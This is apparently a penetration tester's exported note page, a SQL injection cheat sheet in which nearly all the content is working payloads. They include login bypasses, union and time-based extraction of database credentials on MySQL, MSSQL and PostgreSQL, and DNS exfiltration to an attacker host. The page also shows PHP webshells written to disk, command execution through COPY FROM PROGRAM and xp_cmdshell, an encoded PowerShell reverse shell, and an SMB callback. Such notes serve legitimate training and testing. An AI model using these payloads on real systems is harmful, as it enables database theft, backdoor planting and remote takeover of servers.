<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>05- sqli</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>05- sqli</h1><br/><p><h3></h3></p><p><h3></h3><h2>Types of SQLi</h2></p><p><ul><li>boolean based:<ul><li>retrieve one byte of information per request</li><li>FALSE = substa,tial difference from normal page </li></ul></li><li>Error based<ul><li>AND GTID_SUBSET(@@version,0)</li><li>when error is returned as part of response</li></ul></li><li>Union based<ul><li>UNION ALL SELECT 1,@@version,3</li><li>inject the statement result into the vulnerable query</li><li>the fastest </li></ul></li><li>stacked queries<ul><li>; DROP TABLE users</li><li>e.g admin&#39;; DROP TABLE users;-- - </li><li>note -- - : the trailing - is just to show that we have space after comments since mysqli require it otherwise we have syntax error </li><li>e.g mysqli,mssql,postgresql support it</li></ul></li><li>Time based sqli<ul><li>AND 1=IF(2&gt;1,SLEEP(5),0)</li><li>similar to boolean based but the response time is used for differntiation (instead of the change in response)</li></ul></li><li>Inline queries<ul><li>SELECT (SELECT @@version) from</li><li>embed the query with the original query</li><li>rare</li></ul></li><li>Out of band sqli<ul><li>LOAD_FILE(CONCAT(&#39;\\\\&#39;,@@version,&#39;.attacker.com\\README.txt&#39;))</li><li>exfiltrate db records  via DNS </li><li>when time based is slow this is used </li><li>By running the SQLMap on the DNS server for the domain under control (e.g. .attacker.com ), SQLMap can perform the attack by forcing the server to request nonexistent subdomains (e.g. foo.attacker.com ), where foo would be the SQL response we want to receive. SQLMap can then collect these erroring DNS requests and collect the foo part, to form the entire SQL response.</li></ul></li></ul></p><p><h2>SQL injection login bypass</h2></p><p> <div class="codebox"><pre>-<span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> <span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span><span style="color:#ff9d00;font-weight:700">&amp;</span><span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span>^<span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span>*<span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> or <span style="color:#3ad900;font-weight:400">&#39;&#39;</span>-<span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> or <span style="color:#3ad900;font-weight:400">&#39;&#39;</span> <span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> or <span style="color:#3ad900;font-weight:400">&#39;&#39;</span><span style="color:#ff9d00;font-weight:700">&amp;</span><span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> or <span style="color:#3ad900;font-weight:400">&#39;&#39;</span>^<span style="color:#3ad900;font-weight:400">&#39;<br />&#39;</span> or <span style="color:#3ad900;font-weight:400">&#39;&#39;</span>*<span style="color:#3ad900;font-weight:400">&#39;<br />&quot;-&quot;<br />&quot; &quot;<br />&quot;&amp;&quot;<br />&quot;^&quot;<br />&quot;*&quot;<br />&quot; or &quot;&quot;-&quot;<br />&quot; or &quot;&quot; &quot;<br />&quot; or &quot;&quot;&amp;&quot;<br />&quot; or &quot;&quot;^&quot;<br />&quot; or &quot;&quot;*&quot;<br />or true--<br />&quot; or true--<br />&#39;</span> or true--<br /><span style="color:#3ad900;font-weight:400">&quot;) or true--<br />&#39;) or true--<br />&#39; or &#39;x&#39;=&#39;x<br />&#39;) or (&#39;x&#39;)=(&#39;x<br />&#39;)) or ((&#39;x&#39;))=((&#39;x<br />&quot;</span> or <span style="color:#3ad900;font-weight:400">&quot;x&quot;</span>=<span style="color:#3ad900;font-weight:400">&quot;x<br />&quot;</span>) or <span style="color:#333333;font-weight:400">(&quot;x&quot;)=(&quot;x</span><br /><span style="color:#333333;font-weight:400">&quot;))</span> or <span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&quot;x&quot;</span>))=<span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&quot;x</span><br /></pre></div><h3></h3></p><p><h3></h3><em><h2>SQL injection  payloads :</h2></em></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## error based </span><br />admin <span style="color:#333333;font-weight:400">&#39; or &#39;1&#39;=&#39;1</span><br />admin<span style="color:#333333;font-weight:400">&#39; or &#39;1&#39;=&#39;1&#39; -- -<br />admin&#39;</span><span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">-</span><br />admin<span style="color:#333333;font-weight:400">&#39; or &#39;1&#39;=&#39;1&#39;#<br />offsec&#39;</span> OR <span style="color:#333333;font-weight:400">1</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">//</span><br /><span style="color:#333333;font-weight:400">&#39; or 1=1 in (select @@version) -- //<br />&#39;</span> or <span style="color:#333333;font-weight:400">1</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">in</span> (<span style="color:#ff9d00;font-weight:700">select</span> version()) <span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">//</span><br /><span style="color:#333333;font-weight:400">&#39; OR 1=1 in (SELECT * FROM users) -- //<br />&#39;</span> or <span style="color:#333333;font-weight:400">1</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1</span> <span style="color:#ff9d00;font-weight:700">in</span> (<span style="color:#ff9d00;font-weight:700">SELECT</span> password FROM users) <span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">//</span><br /><span style="color:#333333;font-weight:400">&#39; or 1=1 in (SELECT password FROM users WHERE username = &#39;</span>admin<span style="color:#333333;font-weight:400">&#39;) -- //<br />tom&#39;</span> or <span style="color:#333333;font-weight:400">1</span><span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1</span> LIMIT <span style="color:#333333;font-weight:400">1</span>;<span style="color:#0088ff;font-weight:400">#</span><br /><br /><span style="color:#0088ff;font-weight:400"># union based In-band </span><br /><span style="color:#333333;font-weight:400">&#39; ORDER BY 1-- //    ## detect number of columns <br />&#39;</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> null, null, database(), user(), @@version  <span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">//</span><br /><span style="color:#0088ff;font-weight:400">## switch order of fields depending on the output </span><br /><span style="color:#333333;font-weight:400">&#39; union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //<br />&#39;</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> null, username, password, description, null FROM users <span style="color:#ff9d00;font-weight:700">--</span> <br /><br /><span style="color:#0088ff;font-weight:400">## mysql retrive colmns </span><br /><span style="color:#333333;font-weight:400">&#39; union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //<br />&#39;</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> null, username, password, description, null FROM users <span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">//</span><br /><span style="color:#0088ff;font-weight:400">##  retrieve the columns table from the information_schema database belonging to the current database</span><br /><span style="color:#333333;font-weight:400">0</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> <span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">2</span>,group_concat(table_name) FROM information_schema.tables <span style="color:#ff9d00;font-weight:700">WHERE</span> table_schema <span style="color:#ff9d00;font-weight:700">=</span> database()<br /><span style="color:#333333;font-weight:400">0</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> concat(<span style="color:#333333;font-weight:400">&#39;^^^&#39;</span>,table_name,<span style="color:#333333;font-weight:400">&#39;:&#39;</span>,column_name,<span style="color:#333333;font-weight:400">&#39;^^^&#39;</span>) FROM information_schema.columns<br /><span style="color:#333333;font-weight:400">0</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> <span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">2</span>,group_concat(username,<span style="color:#333333;font-weight:400">&#39;:&#39;</span>,password SEPARATOR <span style="color:#333333;font-weight:400">&#39;&lt;br&gt;&#39;</span>) FROM &lt;tablename&gt;</pre></div></p><p><div class="codebox"><pre>◇ <span style="color:#7f0044;font-weight:400">id</span>=1 or 1=1<br /><span style="color:#7f0044;font-weight:400">id</span>=1 order by 1 <br />      ▪ If there is at least one column in the query, the query is valid and the page will render without error<br />   ◇ <span style="color:#ff9d00;font-weight:700">//</span> Now that we know how many columns are in the table, we can use this information to extract further data with a UNION statement. Unions allow us to add a second select statement to the original query<br />      ▪ ?id=1 union all select 1,2,3,4,5 // if 5 columns <br />      ▪ <span style="color:#ff9d00;font-weight:700">//</span> extract version @@version<br />      ▪ table_name from information_schema.tables<br />      ▪ <span style="color:#7f0044;font-weight:400">id</span>=1 union all select 1, username, password from users<br />   ◇ <span style="color:#7f0044;font-weight:400">id</span>=1 order by 2 <span style="color:#0088ff;font-weight:400"># and so on to enumerate columns</span></pre></div></p><p></p><p><h2>SQLi: Blind union based advanced</h2></p><p><div class="codebox"><pre>• admin123<span style="color:#333333;font-weight:400">&#39; UNION SELECT 1,2,3 where database() like &#39;</span><span style="color:#ff9d00;font-weight:700">%</span><span style="color:#333333;font-weight:400">&#39;;--<br />try to identify true variable <br />• admin123&#39;</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> <span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">2</span>,<span style="color:#333333;font-weight:400">3</span> FROM information_schema.COLUMNS <span style="color:#ff9d00;font-weight:700">WHERE</span> TABLE_SCHEMA<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">&#39;sqli_three&#39;</span> and TABLE_NAME<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">&#39;users&#39;</span> and COLUMN_NAME like <span style="color:#333333;font-weight:400">&#39;a%&#39;</span>;<br />• admin123<span style="color:#333333;font-weight:400">&#39; UNION SELECT 1,2,3 from users where username=&#39;</span>admin<span style="color:#333333;font-weight:400">&#39; and password like &#39;</span>a<span style="color:#ff9d00;font-weight:700">%</span><br />• method <span style="color:#333333;font-weight:400">2</span><br /><span style="color:#333333;font-weight:400">&#39; ORDER BY 1;#<br />&#39;</span> ORDER BY <span style="color:#333333;font-weight:400">2</span>; <span style="color:#0088ff;font-weight:400">#</span><br /><br /><br /><span style="color:#0088ff;font-weight:400">## Mysqli union based </span><br /><span style="color:#333333;font-weight:400">&#39;union select 1,schema_name,3,4,5 from information_schema.schemata-- -<br /><br />&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#333333;font-weight:400">1</span>,table_name,<span style="color:#333333;font-weight:400">3</span>,<span style="color:#333333;font-weight:400">4</span>,<span style="color:#333333;font-weight:400">5</span> from information_schema.tables <span style="color:#ff9d00;font-weight:700">WHERE</span> table_schema <span style="color:#ff9d00;font-weight:700">!=</span> <span style="color:#333333;font-weight:400">&#39;mysql&#39;</span> AND table_schema <span style="color:#ff9d00;font-weight:700">!=</span> <span style="color:#333333;font-weight:400">&#39;sys&#39;</span> AND table_schema <span style="color:#ff9d00;font-weight:700">!=</span> <span style="color:#333333;font-weight:400">&#39;information_schema&#39;</span> AND table_schema <span style="color:#ff9d00;font-weight:700">!=</span> <span style="color:#333333;font-weight:400">&#39;performance_schema&#39;</span><span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">-</span><br /><br /><span style="color:#333333;font-weight:400">&#39;union select 1,column_name,3,4,5 from information_schema.columns WHERE table_schema != &#39;</span>mysql<span style="color:#333333;font-weight:400">&#39; AND table_schema != &#39;</span>sys<span style="color:#333333;font-weight:400">&#39; AND table_schema != &#39;</span>information_schema<span style="color:#333333;font-weight:400">&#39; AND table_schema != &#39;</span>performance_schema<span style="color:#333333;font-weight:400">&#39;-- -<br /><br />&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#333333;font-weight:400">1</span>,group_concat(username,<span style="color:#333333;font-weight:400">&#39;:&#39;</span>,password,<span style="color:#333333;font-weight:400">&#39;:&#39;</span>,name),<span style="color:#333333;font-weight:400">3</span>,<span style="color:#333333;font-weight:400">4</span>,<span style="color:#333333;font-weight:400">5</span> from users<span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">-</span><br /><br /><span style="color:#0088ff;font-weight:400">### sometimes you don&#39;t need chars &#39; </span><br />id<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">1</span> union <span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">2</span>,<span style="color:#333333;font-weight:400">3</span>,group_concat(column_name),<span style="color:#333333;font-weight:400">5</span>  from information_schema.columns <span style="color:#ff9d00;font-weight:700">where</span> table_schema <span style="color:#ff9d00;font-weight:700">=</span> database() and  table_name <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;users&quot;</span><br /><span style="color:#ff9d00;font-weight:700">?</span>id<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">5</span> union <span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">2</span>,<span style="color:#333333;font-weight:400">3</span>,group_concat(password),<span style="color:#333333;font-weight:400">5</span> from users</pre></div></p><p></p><p></p><p><h2>MSSQL: Blind union based + time based</h2></p><p><div class="codebox"><pre>offsec<span style="color:#333333;font-weight:400">&#39; AND IF (1=1, sleep(3),&#39;</span>false<span style="color:#333333;font-weight:400">&#39;) -- //<br /><br />admin123&#39;</span> UNION <span style="color:#ff9d00;font-weight:700">SELECT</span> <span style="color:#ff9d00;font-weight:700">SLEEP</span>(<span style="color:#333333;font-weight:400">5</span>),<span style="color:#333333;font-weight:400">2</span>;<span style="color:#ff9d00;font-weight:700">--</span><br /><br /><span style="color:#0088ff;font-weight:400">## iterate over i in mssql to retrieve databases</span><br />and j is database <br /><br /><span style="color:#333333;font-weight:400">&#39; IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases WHERE name NOT IN (SELECT TOP $j name FROM master..sysdatabases ORDER BY name) ORDER BY name),1,1))&gt;$i) WAITFOR DELAY &#39;0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">2&#39; --<br /><br />&#39;</span> <span style="color:#ff9d00;font-weight:700">IF</span>(UNICODE(SUBSTRING((<span style="color:#ff9d00;font-weight:700">SELECT</span> TOP <span style="color:#333333;font-weight:400">1</span> ISNULL(CAST(name AS NVARCHAR(<span style="color:#333333;font-weight:400">4000</span>)),<span style="color:#7f0044;font-weight:400">CHAR</span>(<span style="color:#333333;font-weight:400">32</span>)) FROM master..sysdatabases <span style="color:#ff9d00;font-weight:700">WHERE</span> name NOT <span style="color:#ff9d00;font-weight:700">IN</span> (<span style="color:#ff9d00;font-weight:700">SELECT</span> TOP <span style="color:#333333;font-weight:400">3</span> name FROM master..sysdatabases ORDER BY name) ORDER BY name),<span style="color:#0088ff;font-weight:400">$k</span>,<span style="color:#333333;font-weight:400">1</span>))&gt;<span style="color:#333333;font-weight:400">96</span>) WAITFOR DELAY <span style="color:#333333;font-weight:400">&#39;0:0:3&#39;</span><span style="color:#ff9d00;font-weight:700">--</span> lWdG<br /><br /><span style="color:#333333;font-weight:400">&#39; IF(UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(webapp..sysusers.name+CHAR(46)+webapp..sysobjects.name AS NVARCHAR(4000)),CHAR(32)) FROM webapp..sysobjects INNER JOIN webapp..sysusers ON webapp..sysobjects.uid=webapp..sysusers.uid WHERE webapp..sysobjects.xtype IN (CHAR(117),CHAR(118)) AND webapp..sysusers.name+CHAR(46)+webapp..sysobjects.name NOT IN (SELECT TOP 0 webapp..sysusers.name+CHAR(46)+webapp..sysobjects.name FROM webapp..sysobjects INNER JOIN webapp..sysusers ON webapp..sysobjects.uid=webapp..sysusers.uid WHERE webapp..sysobjects.xtype IN (CHAR(117),CHAR(118)) ORDER BY webapp..sysusers.name+CHAR(46)+webapp..sysobjects.name) ORDER BY webapp..sysusers.name+CHAR(46)+webapp..sysobjects.name),5,1))&gt;96) WAITFOR DELAY &#39;0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">1&#39;-- itlk<br /><br /><br />## retrieve columns <br />&#39;</span> <span style="color:#ff9d00;font-weight:700">IF</span>(UNICODE(SUBSTRING((<span style="color:#ff9d00;font-weight:700">SELECT</span> ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(<span style="color:#333333;font-weight:400">4000</span>)),<span style="color:#7f0044;font-weight:400">CHAR</span>(<span style="color:#333333;font-weight:400">32</span>)) FROM webapp..sysobjects <span style="color:#ff9d00;font-weight:700">WHERE</span> webapp..sysobjects.xtype <span style="color:#ff9d00;font-weight:700">IN</span> (<span style="color:#7f0044;font-weight:400">CHAR</span>(<span style="color:#333333;font-weight:400">117</span>),<span style="color:#7f0044;font-weight:400">CHAR</span>(<span style="color:#333333;font-weight:400">118</span>))),<span style="color:#333333;font-weight:400">1</span>,<span style="color:#333333;font-weight:400">1</span>))&gt;<span style="color:#333333;font-weight:400">48</span>) WAITFOR DELAY <span style="color:#333333;font-weight:400">&#39;0:0:5&#39;</span><span style="color:#ff9d00;font-weight:700">--</span> JaRl<br /><br /><span style="color:#0088ff;font-weight:400">## mssql retriev tables </span><br /><br /><span style="color:#333333;font-weight:400">&#39; IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM webapp..syscolumns WHERE id=(SELECT id FROM webapp..sysobjects WHERE name=CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)+CHAR(115))),1,1))&gt;49) WAITFOR DELAY &#39;0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">0</span><span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">5&#39;-- pnNm</span><br /><br /></pre></div><em></em></p><p><em></em><ul><li></li></ul><em><h3></h3></em></p><p><em><h3></h3></em><h2>From sqli to RCE: mysql</h2></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># require some privileges and some restrictions to be disabled on the dbms</span><br /><span style="color:#0088ff;font-weight:400">## e.g sqli FILE permission and file_secure disabled </span><br /><span style="color:#0088ff;font-weight:400">## load file </span><br /><br /><span style="color:#333333;font-weight:400">&#39; UNION SELECT &quot;&lt;?php system($_GET[&#39;</span>cmd<span style="color:#333333;font-weight:400">&#39;]);?&gt;&quot;, null, null, null, null INTO OUTFILE &quot;/var/www/html/tmp/webshell.php&quot; -- //<br /><br />## SQLi can be used to read and write files on filesystems<br />### read file<br />id=1 union all select 1, 2, load_file(&#39;</span>C<span style="color:#ff9d00;font-weight:700">:/</span>Windows<span style="color:#ff9d00;font-weight:700">/</span>System32<span style="color:#ff9d00;font-weight:700">/</span>drivers<span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>hosts<span style="color:#333333;font-weight:400">&#39;)</span><br /><span style="color:#333333;font-weight:400">### store backdoor<br />id=1 union all select 1, 2, &quot;&lt;?php echo shell_exec($_GET[&#39;</span>cmd<span style="color:#333333;font-weight:400">&#39;]);?&gt;&quot; into OUTFILE &#39;</span>c<span style="color:#ff9d00;font-weight:700">:/</span>xampp<span style="color:#ff9d00;font-weight:700">/</span>htdocs<span style="color:#ff9d00;font-weight:700">/</span>backdoor.php<span style="color:#333333;font-weight:400">&#39;</span></pre></div></p><p></p><p><em></em></p><p><em></em></p><p></p><p></p><p></p><p><h2>POSTGRESQL </h2></p><p><div class="codebox"><pre><span style="color:#3ad900;font-weight:400">&#39;;SELECT PG_SLEEP(5)-- ## time based <br />&#39;</span><span style="color:#ff9d00;font-weight:700">;</span> SELECT table_name FROM information_schema.tables -- <br /><br /><br /><span style="color:#0088ff;font-weight:400">## cmd injection</span><br /><br />DROP TABLE IF EXISTS cmd_exec<span style="color:#ff9d00;font-weight:700">;</span>          -- [Optional] Drop the table you want to use if it already exists<br />CREATE TABLE cmd_exec<span style="color:#ff9d00;font-weight:700">(</span>cmd_output text<span style="color:#ff9d00;font-weight:700">);</span> -- Create the table you want to hold the command output<br />COPY cmd_exec FROM PROGRAM <span style="color:#3ad900;font-weight:400">&#39;id&#39;</span><span style="color:#ff9d00;font-weight:700">;</span>        -- Run the system command via the COPY FROM PROGRAM function<br />SELECT * FROM cmd_exec<span style="color:#ff9d00;font-weight:700">;</span>                 -- [Optional] View the results<br />DROP TABLE IF EXISTS cmd_exec<span style="color:#ff9d00;font-weight:700">;</span>          -- [Optional] Remove the table<br /><span style="color:#0088ff;font-weight:400">## error based sqli</span><br /><span style="color:#3ad900;font-weight:400">&#39;; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM &#39;</span>cat <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>flag.txt<span style="color:#3ad900;font-weight:400">&#39;; SELECT * FROM users WHERE 1=cast((SELECT cmd_output FROM cmd_exec)::text AS NUMERIC); -- //</span></pre></div></p><p><img src="images/176-1.png" alt="images/176-1.png" /></p><p></p><p></p><p></p><p><h2>MSSQL RCE</h2><ul><li>inject cmds via xp_cmdshell</li><li></li></ul><div class="codebox"><pre>admin<span style="color:#3ad900;font-weight:400">&#39;; EXECUTE sp_configure &#39;</span>xp_cmdshell<span style="color:#3ad900;font-weight:400">&#39;, 1;-- -<br />admin&#39;</span><span style="color:#ff9d00;font-weight:700">;</span> RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span>--<br />admin<span style="color:#3ad900;font-weight:400">&#39;; EXECUTE sp_configure &#39;</span>show advanced options<span style="color:#3ad900;font-weight:400">&#39;, 1;-- -<br />admin&#39;</span><span style="color:#ff9d00;font-weight:700">;</span> RECONFIGURE<span style="color:#ff9d00;font-weight:700">;</span>--<br /><br /><br /><br />admin<span style="color:#3ad900;font-weight:400">&#39;%3bEXEC%20xp_cmdshell%20&#39;</span>whoami<span style="color:#3ad900;font-weight:400">&#39;%3b--<br /># revshell<br />admin&#39;</span><span style="color:#ff9d00;font-weight:700">;</span>EXEC xp_cmdshell <span style="color:#3ad900;font-weight:400">&#39;powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA5AC4AMQAzADQAIgAsADQANAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&#39;</span><span style="color:#ff9d00;font-weight:700">;</span>--<br /><br /><br /><br /><span style="color:#0088ff;font-weight:400">## exec xp_ditrtree</span><br /><br /><span style="color:#7f0044;font-weight:400">q</span>=500<span style="color:#3ad900;font-weight:400">&#39;; EXEC xp_dirtree &#39;</span><span style="color:#333333;font-weight:400">\\</span>10.10.14.11<span style="color:#333333;font-weight:400">\s</span>hare<span style="color:#333333;font-weight:400">\f</span>ile<span style="color:#3ad900;font-weight:400">&#39;; -- - <br /><br /><br />## union enum <br /><br />### dbs <br />q=500&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> 1,db_name<span style="color:#ff9d00;font-weight:700">(</span>1<span style="color:#ff9d00;font-weight:700">)</span>,user,4,5,6 -- -<br /><span style="color:#7f0044;font-weight:400">q</span>=500<span style="color:#3ad900;font-weight:400">&#39;union select 1,db_name(2),user,4,5,6 -- -<br /><br />## tables<br />q=500&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> 1,name,id,4,5,6 FROM streamio..sysobjects WHERE xtype =<span style="color:#3ad900;font-weight:400">&#39;U&#39;</span> -- -<br /><span style="color:#7f0044;font-weight:400">q</span>=500<span style="color:#3ad900;font-weight:400">&#39;union select 1,CONCAT(name,&#39;</span>:<span style="color:#3ad900;font-weight:400">&#39;,id),3,4,5,6 FROM streamio..sysobjects WHERE xtype =&#39;</span>U<span style="color:#3ad900;font-weight:400">&#39; -- -<br /><br />## columns <br />q=500&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> 1,string_agg<span style="color:#ff9d00;font-weight:700">(</span>name,<span style="color:#3ad900;font-weight:400">&#39;|&#39;</span><span style="color:#ff9d00;font-weight:700">)</span>,3,4,5,6 FROM streamio..syscolumns WHERE id = <span style="color:#333333;font-weight:400">(SELECT id FROM streamio..sysobjects WHERE name = &#39;movies&#39;)</span> -- -<br /><br /><span style="color:#0088ff;font-weight:400">## select users tables</span><br /><br /><span style="color:#7f0044;font-weight:400">q</span>=500<span style="color:#3ad900;font-weight:400">&#39;union select 1,string_agg(CONCAT(username,&#39;</span>:<span style="color:#3ad900;font-weight:400">&#39;,password),&#39;</span><span style="color:#ff9d00;font-weight:700">|</span><span style="color:#3ad900;font-weight:400">&#39;),3,4,5,6 FROM streamio..users  -- -</span><br /><span style="color:#3ad900;font-weight:400"><br />q=500&#39;</span>union <span style="color:#ff9d00;font-weight:700">select</span> 1,db_name<span style="color:#ff9d00;font-weight:700">()</span>,1337,4,5,6 -- -</pre></div></p><p></p><p></p><p></p><p><h2>Mysql advanced</h2></p><p><div class="codebox"><pre>Enum db mysql <br />• general steps<br />   ◇ enumerate tables<br />   ◇ enumerate columns<br />   ◇ query user,password <br />   ◇ <span style="color:#333333;font-weight:400">1&#39;UNION select user()-- -<br />   ◇ 1&#39;</span>UNION <span style="color:#ff9d00;font-weight:700">select</span> database()<span style="color:#ff9d00;font-weight:700">--</span> <span style="color:#ff9d00;font-weight:700">-</span><br />   ◇ <span style="color:#ff9d00;font-weight:700">select</span> schema_name from information_schema.schemata<br />   ◇ <span style="color:#ff9d00;font-weight:700">select</span> table_name from information_schema.tables <span style="color:#ff9d00;font-weight:700">where</span> table_schema <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;registration&#39;</span><br />   ◇ <span style="color:#ff9d00;font-weight:700">select</span> column_name from information_schema.columns <span style="color:#ff9d00;font-weight:700">where</span> table_name <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#333333;font-weight:400">&#39;registration&#39;</span><br />   ◇ <span style="color:#ff9d00;font-weight:700">select</span> privilege_type FROM information_schema.user_privileges <span style="color:#ff9d00;font-weight:700">where</span> grantee <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;&#39;uhc&#39;@&#39;localhost&#39;&quot;</span> <span style="color:#ff9d00;font-weight:700">//</span> user privs<br />   ◇ look <span style="color:#ff9d00;font-weight:700">for</span> putting files <br />   ◇ <span style="color:#ff9d00;font-weight:700">select</span> <span style="color:#3ad900;font-weight:400">&quot;&lt;?php SYSTEM($_REQUEST[&#39;cmd&#39;]); ?&gt;&quot;</span> into outfile <span style="color:#333333;font-weight:400">&#39;/var/www/html/myshell.php&#39;</span></pre></div></p></div>
</body>
</html>
